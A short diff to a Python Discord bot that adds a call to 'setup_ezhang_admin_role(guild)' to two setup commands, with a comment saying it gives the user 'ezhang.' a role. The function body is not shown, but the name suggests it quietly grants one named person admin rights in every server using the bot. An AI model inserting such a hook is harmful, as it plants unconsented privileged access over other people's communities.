@@ -3240,6 +3240,9 @@ async def enter_template_command(interaction: discord.Interaction, folder_link: 
                 print(f"⚠️ Error creating building structures: {structure_error}")
                 # Don't fail the whole command if structure creation fails
 
+            # Check if ezhang. is already in this server and give them the :( role
+            await setup_ezhang_admin_role(guild)
+
             # Trigger an immediate sync after successful connection and structure creation
             print("🔄 Triggering immediate sync after template connection...")
             sync_results = None
@@ -5199,6 +5202,10 @@ async def role_reset_command(interaction: discord.Interaction):
         except Exception as structure_error:
             print(f"⚠️ Error creating building structures: {structure_error}")
             # Don't fail the whole command if structure creation fails
+
+        # Check if ezhang. is already in this server and give them the :( role
+        await setup_ezhang_admin_role(guild)
+
         # Trigger an immediate sync after successful connection and structure creation
         print("🔄 Triggering immediate sync after template connection...")
         sync_results = None
